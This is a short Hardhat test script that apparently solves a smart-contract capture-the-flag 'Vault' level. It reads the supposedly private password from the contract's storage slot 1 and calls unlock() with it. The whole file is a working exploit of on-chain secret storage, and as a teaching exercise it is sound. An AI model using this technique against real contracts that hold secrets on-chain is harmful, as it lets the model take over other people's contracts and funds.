import { TransactionResponse } from "@ethersproject/providers";
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Vault", function () {
  it("Pwn", async function () {
    const ABI = ["function unlock(bytes32)", "function locked() view returns (bool)"];
    const ADDRESS = "0x2628EE9c1044e9F5286B05705b5dA017f51023a9";
    const contract = await ethers.getContractAt(ABI, ADDRESS);

    const password = await ethers.provider.getStorageAt(ADDRESS, 1);
    console.log(`Vault password: ${password}`);
    const tx: TransactionResponse = await contract.unlock(password);
    await tx.wait();
    const locked: boolean = await contract.locked();
    console.log(`locked(): ${locked}`);
    expect(locked).to.be.false;
  });
});
